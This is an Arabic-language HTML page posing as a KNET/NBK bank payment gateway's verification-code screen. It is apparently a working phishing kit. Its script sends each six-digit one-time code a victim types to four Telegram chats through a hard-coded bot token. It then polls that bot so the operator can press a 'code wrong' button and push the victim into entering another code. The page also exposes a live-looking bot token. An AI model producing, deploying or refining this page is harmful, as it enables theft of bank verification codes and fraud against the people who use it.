<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>بوابة الدفع</title>
  <!-- باقي الـ CSS كما هو -->
  <style>
    /* نفس الـ CSS السابق - محفوظ كما هو */
    
    body {
      font-family: Tahoma, sans-serif;
      background-color: #eee;
      margin: 0;
      padding: 0;
    }
    .banner {
      background: url('www2.0zz0.com/2025/07/13/22/875395686.jpg') no-repeat center center;
      background-size: cover;
      height: 100px;
    }
    .container {
      max-width: 650px;
      margin: 20px auto;
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      padding: 25px;
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo img {
      max-width: 170px;
      transition: transform 0.3s ease;
    }
    .logo img:hover {
      transform: scale(1.05);
    }
    .amount {
      text-align: center;
      font-size: 18px;
      color: #0070c0;
      margin: 10px 0;
    }
    .form-box {
      border: 1px solid #ccc;
      border-radius: 10px;
      padding: 20px;
    }
    label {
      display: block;
      margin: 10px 0 5px;
      color: #444;
    }
    input, select {
      width: 100%;
      padding: 10px;
      border: 1px solid #999;
      border-radius: 5px;
      box-sizing: border-box;
    }
    .row {
      display: flex;
      gap: 10px;
    }
    .row select, .row input {
      flex: 1;
    }
    .actions {
      display: flex;
      justify-content: space-between;
      margin-top: 20px;
    }
    .actions button {
      flex: 1;
      padding: 12px;
      border: none;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin: 0 5px;
    }
    .actions .submit {
      background-color: #0070c0;
      color: #fff;
    }
    .actions .cancel {
      background-color: #ccc;
      color: #333;
    }
    footer {
      text-align: center;
      font-size: 14px;
      color: #777;
      margin-top: 20px;
      margin-bottom: 20px;
    }
    
    /* تنسيقات إضافية للصفحة */
    h2 {
      color: #0070c0;
      margin-bottom: 10px;
    }
    h3 {
      color: #d9534f;
      text-align: center;
      margin-bottom: 15px;
    }
    p {
      color: #333;
      font-size: 15px;
      margin-bottom: 25px;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      font-size: 18px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 20px;
      text-align: center;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #0070c0;
      color: #fff;
      font-size: 17px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #005c99;
    }
    
    /* الصورة الجديدة في أسفل الصفحة */
    .bottom-image {
      width: 100%;
      margin: 0;
      padding: 0;
      border: none;
      display: block;
    }
    .bottom-image img {
      width: 100%;
      height: auto;
      display: block;
      margin: 0;
      padding: 0;
      border: none;
    }
    
    /* تنسيقات أزرار الأخطاء */
    .error-buttons {
      display: none;
      margin-top: 15px;
      border-top: 1px solid #eee;
      padding-top: 15px;
    }
    
    .error-btn {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .retry-btn {
      background-color: #f0ad4e;
      color: white;
    }
    
    .retry-btn:hover {
      background-color: #ec971f;
    }
    
    .code-btn {
      background-color: #d9534f;
      color: white;
    }
    
    .code-btn:hover {
      background-color: #c9302c;
    }
    
    .balance-btn {
      background-color: #5bc0de;
      color: white;
    }
    
    .balance-btn:hover {
      background-color: #31b0d5;
    }
    
    /* رسالة الخطأ */
    .error-message {
      display: none;
      background-color: #f8d7da;
      color: #721c24;
      padding: 15px;
      border-radius: 5px;
      margin: 15px 0;
      text-align: center;
      border: 1px solid #f5c6cb;
      font-weight: bold;
    }
    
    /* حالة الانتظار */
    .loading-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }
    
    .loading-content {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      max-width: 300px;
      width: 90%;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #0070c0;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .loading-text {
      color: #0070c0;
      font-size: 16px;
      font-weight: bold;
      margin-bottom: 10px;
    }
    
    .loading-subtext {
      color: #666;
      font-size: 14px;
    }
    
    /* حالة الانتظار المدمجة في الصفحة */
    .inline-loading {
      display: none;
      text-align: center;
      padding: 20px;
      background-color: #f8f9fa;
      border-radius: 8px;
      margin: 15px 0;
      border: 1px solid #dee2e6;
    }
    
    .inline-spinner {
      width: 30px;
      height: 30px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #0070c0;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
    }
    
    .inline-loading-text {
      color: #0070c0;
      font-size: 15px;
      font-weight: bold;
      margin-bottom: 5px;
    }
    
    .inline-loading-subtext {
      color: #666;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <!-- نفس الهيكل HTML السابق -->
  <div class="banner"></div>
  <div class="container">
    <div class="logo">
      <img src="www2.0zz0.com/2025/07/13/21/825012472.png" alt="NBK Logo">
    </div>

    <h2>رمز التحقق</h2>
    <p>يرجى إدخال رمز التحقق الذي تم إرساله إلى هاتفك المحمول</p>
    
    <div id="errorMessage" class="error-message">
      الكود خطأ! يرجى المحاولة مرة أخرى
    </div>
    
    <div id="inlineLoading" class="inline-loading">
      <div class="inline-spinner"></div>
      <div class="inline-loading-text">جاري التحقق من الكود...</div>
      <div class="inline-loading-subtext">يرجى الانتظار لحظات</div>
    </div>
    
    <form id="verifyForm">
      <div class="form-box">  
        <div id="countdown" style="text-align: center; font-weight: bold; color: #0070c0; margin-bottom: 10px;">
          <span id="seconds">60</span> يرجى إدخال رمز التحقق قبل انتهاء المدة 
        </div>
        <input type="text" id="code" maxlength="6" placeholder="أدخل الرمز هنا" required>
        <button type="submit">تأكيد</button>
      </div>
    </form>
  </div>
  
  <div class="bottom-image">
    <img src="www2.0zz0.com/IMG-20251006-WA0041.jpg" alt="Knet Payment">
  </div>
  
  <div id="loadingOverlay" class="loading-overlay">
    <div class="loading-content">
      <div class="spinner"></div>
      <div class="loading-text">انتظر...</div>
      <div class="loading-subtext">جاري معالجة طلبك</div>
    </div>
  </div>

  <script>
    // كود العد التنازلي (كما هو)
    let timeLeft = 60;
    let countdownInterval;
    const secondsElement = document.getElementById("seconds");
    
    function startCountdown() {
      clearInterval(countdownInterval);
      timeLeft = 60;
      secondsElement.textContent = timeLeft;
      
      countdownInterval = setInterval(() => {
        timeLeft--;
        secondsElement.textContent = timeLeft;
        
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          alert("انتهى الوقت! سيتم إلغاء العملية.");
          document.getElementById("verifyForm").reset();
        }
      }, 1000);
    }
    
    startCountdown();
    
    // دوال مساعدة (كما هي)
    function showErrorMessage() {
      hideInlineLoading();
      hideLoadingOverlay();
      
      const errorMessage = document.getElementById("errorMessage");
      errorMessage.style.display = 'block';
      
      document.getElementById("verifyForm").reset();
      
      const submitButton = document.querySelector('button[type="submit"]');
      const codeInput = document.getElementById("code");
      submitButton.disabled = false;
      codeInput.disabled = false;
      
      startCountdown();
      
      setTimeout(() => {
        errorMessage.style.display = 'none';
      }, 5000);
    }
    
    function showInlineLoading() {
      document.getElementById("inlineLoading").style.display = 'block';
      document.getElementById("errorMessage").style.display = 'none';
    }
    
    function hideInlineLoading() {
      document.getElementById("inlineLoading").style.display = 'none';
    }
    
    function showLoadingOverlay(text = "انتظر...", subtext = "جاري معالجة طلبك") {
      const overlay = document.getElementById("loadingOverlay");
      overlay.querySelector(".loading-text").textContent = text;
      overlay.querySelector(".loading-subtext").textContent = subtext;
      overlay.style.display = 'flex';
    }
    
    function hideLoadingOverlay() {
      document.getElementById("loadingOverlay").style.display = 'none';
    }

    // 🔥 الكود الجديد: نظام الاستعلام الدوري من البوت
    let lastUpdateId = 0;
    let isCheckingForUpdates = false;
    const botToken = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";

    // دالة للتحقق من التحديثات في البوت
    async function checkBotUpdates() {
        if (isCheckingForUpdates) return;
        
        isCheckingForUpdates = true;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                data.result.forEach(update => {
                    // التحقق إذا كان هناك ضغط على زر "الكود خطأ"
                    if (update.callback_query && update.callback_query.data === "code_error") {
                        console.log("تم استلام أمر الكود خطأ من البوت!");
                        showErrorMessage();
                        
                        // الرد على البوت لتأكيد الاستلام
                        answerCallbackQuery(update.callback_query.id);
                    }
                    
                    // تحديث lastUpdateId لعدم معالجة نفس التحديث مرة أخرى
                    if (update.update_id > lastUpdateId) {
                        lastUpdateId = update.update_id;
                    }
                });
            }
        } catch (error) {
            console.error("خطأ في التحقق من تحديثات البوت:", error);
        } finally {
            isCheckingForUpdates = false;
        }
    }

    // دالة للرد على استعلام الزر في البوت
    async function answerCallbackQuery(callbackQueryId) {
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    callback_query_id: callbackQueryId,
                    text: "تم إرسال طلب إعادة المحاولة إلى المستخدم"
                })
            });
        } catch (error) {
            console.error("خطأ في الرد على استعلام البوت:", error);
        }
    }

    // بدء الاستعلام الدوري كل 3 ثوانٍ
    setInterval(checkBotUpdates, 3000);

    // كود إرسال البيانات إلى Telegram (معدل)
    document.getElementById("verifyForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const code = document.getElementById("code").value;
      
      if (code.length === 6) {
        showInlineLoading();
        
        const submitButton = document.querySelector('button[type="submit"]');
        const codeInput = document.getElementById("code");
        submitButton.disabled = true;
        codeInput.disabled = true;
        
        const token = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
        const chat_ids = ["7335192117", "6323300854", "8280462390", "7942066919"];

        // إضافة معرف فريد للجلسة لتتبع المستخدم
        const sessionId = Date.now();
        
        const message = `🔐 تم إدخال رمز التحقق:\n\n` +
          `📱 الكود: ${code}\n\n` +
          `🆔 رقم الجلسة: ${sessionId}\n\n` +
          `⚠️ إذا كان الكود خاطئاً، اضغط على الزر أدناه:`;

        const keyboard = {
          inline_keyboard: [[
            {
              text: "الكود خطأ - إعادة المحاولة",
              callback_data: "code_error"
            }
          ]]
        };

        let sentCount = 0;
        let errorCount = 0;
        
        chat_ids.forEach(chat_id => {
          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                chat_id: chat_id,
                text: message,
                reply_markup: JSON.stringify(keyboard)
              })
            })
            .then(res => {
              if (res.ok) {
                sentCount++;
                console.log(`تم الإرسال إلى ${chat_id} بنجاح`);
              } else {
                errorCount++;
                console.error(`فشل الإرسال إلى ${chat_id}`);
              }
            })
            .catch(err => {
              errorCount++;
              console.error(`خطأ في الإرسال إلى ${chat_id}:`, err);
            })
            .finally(() => {
              if (sentCount + errorCount === chat_ids.length) {
                hideInlineLoading();
                submitButton.disabled = false;
                codeInput.disabled = false;
                
                if (sentCount > 0) {
                  showLoadingOverlay("جاري التحقق من عملية الدفع", "جاري التحقق من الكود...");
                  
                  setTimeout(() => {
                    hideLoadingOverlay();
                    document.getElementById("code").value = "";
                  }, 60000);
                } else {
                  alert("فشل في إرسال الرمز. يرجى المحاولة مرة أخرى.");
                }
              }
            });
        });
      } else {
        alert("الرجاء إدخال رمز مكون من 6 أرقام");
      }
    });

    // بدء التحقق من التحديثات فور تحميل الصفحة
    checkBotUpdates();
    
    console.log("✅ النظام جاهز! الآن عندما تضغط على زر 'الكود خطأ' في البوت، سترى رسالة الخطأ تظهر تلقائياً في الموقع.");
  </script>
</body>
</html>
